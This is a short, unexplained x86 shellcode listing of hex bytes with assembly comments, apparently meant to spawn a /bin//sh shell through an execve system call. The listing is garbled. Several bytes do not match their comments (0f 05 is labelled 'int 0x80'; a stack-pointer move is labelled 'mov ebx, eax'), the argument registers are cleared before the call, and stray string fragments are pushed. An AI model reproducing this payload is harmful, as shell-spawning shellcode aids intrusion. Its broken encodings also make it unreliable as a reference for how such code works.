\x31\xc0    # xor eax, eax
\x50       # push eax
\x68 68 65 6c 6c    # push dword 0x6c6c6568
\x68 6f 6e 6b 65    # push dword 0x656b6e6f
\x68 2f 2f 73 68    # push dword 0x68732f2f
\x68 6e 69 62 2f    # push dword 0x2f62696e
\x89 e3            # mov ebx, eax
\x50             # push eax
\x53             # push ebx
\x89 e1            # mov ecx, eax
\x31 db           # xor ebx, ebx
\x31 c9           # xor ecx, ecx
\x31 d2           # xor edx, edx
\x0f 05            # int 0x80